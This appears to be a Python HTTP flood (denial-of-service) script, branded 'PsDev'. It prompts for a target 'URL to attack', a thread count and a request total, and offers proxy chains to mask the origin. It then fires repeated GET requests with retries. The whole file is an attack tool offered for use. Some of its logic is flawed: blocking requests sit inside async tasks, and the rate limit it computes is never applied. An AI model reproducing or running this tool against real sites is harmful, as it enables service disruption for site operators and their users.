import asyncio
import requests
from termcolor import colored
import pyfiglet
import signal
import sys


def print_ascii_art():
    ascii_art = pyfiglet.figlet_format("PsDev")
    blue_ascii_art = colored(ascii_art, "blue")
    print(blue_ascii_art)


async def perform_action(total_requests, use_proxy, proxy):
    count = 0
    counts = {"success": 0, "failure": 0}

    def signal_handler(sig, frame):
        print(colored("\nUser terminated the script. Stopping...", "yellow"))
        print_success_failure_rates(counts)
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    while count < total_requests:
        tasks = []
        for _ in range(min(num_threads, total_requests - count)):
            tasks.append(asyncio.create_task(send_request(count, counts, use_proxy, proxy)))
            count += 1
        await asyncio.gather(*tasks)
        print(colored("Performing the requests", "cyan"))

    print_success_failure_rates(counts)
    print(colored("Successfully Completed the Requests", "yellow"))


async def send_request(count, counts, use_proxy, proxy, retry=3):
    try:
        if use_proxy:
            response = requests.get(url, proxies=proxy)
        else:
            response = requests.get(url)
        response.raise_for_status()
        counts["success"] += 1
        print(colored(f"[{count}] Sent Successfully!", "green"))
    except requests.exceptions.RequestException as e:
        counts["failure"] += 1
        print(colored(f"[{count}] Failed - {str(e)}", "red"))
        if retry > 0:
            print(colored(f"Retrying... ({retry} retries left)", "yellow"))
            await asyncio.sleep(1)
            await send_request(count, counts, use_proxy, proxy, retry - 1)
    except KeyboardInterrupt:
        pass


def get_user_input(prompt, min_value=1, max_value=None):
    while True:
        try:
            value = int(input(prompt))
            if max_value is not None and value > max_value:
                raise ValueError
            elif value < min_value:
                raise ValueError
            return value
        except ValueError:
            print(f"Invalid input. Please enter a positive integer between {min_value} and {max_value or 'infinity'}.")


def print_success_failure_rates(counts):
    total_requests = counts["success"] + counts["failure"]
    success_rate = (counts["success"] / total_requests) * 100 if total_requests > 0 else 0
    failure_rate = (counts["failure"] / total_requests) * 100 if total_requests > 0 else 0

    print(f"Success Rate: {success_rate:.2f}%")
    print(f"Failure Rate: {failure_rate:.2f}%")


print_ascii_art()

num_threads_max = 100  # Set a reasonable maximum limit for the number of threads
num_threads = get_user_input("Enter the number of threads: ", max_value=num_threads_max)
url = input("Enter the URL to attack: ")

# Validate URL
try:
    requests.get(url)
except requests.exceptions.RequestException as e:
    print(colored(f"Invalid URL - {str(e)}", "red"))
    sys.exit(1)

total_requests = get_user_input("Enter the total number of requests to make: ")

# Prompt the user to choose between predefined proxy chains or not
use_predefined_proxies = input("Do you want to use predefined proxy chains? (y/n): ").lower() == "y"
if use_predefined_proxies:
    # Replace the placeholders with actual working proxy addresses
    proxy = {
        "http": "http://proxy1.example.com:8080",
        "https": "https://proxy1.example.com:8080",
    }
else:
    proxy = {}

requests_per_second = get_user_input("Enter the number of requests per second: ")
interval = 1 / requests_per_second

asyncio.run(perform_action(total_requests, use_predefined_proxies, proxy))
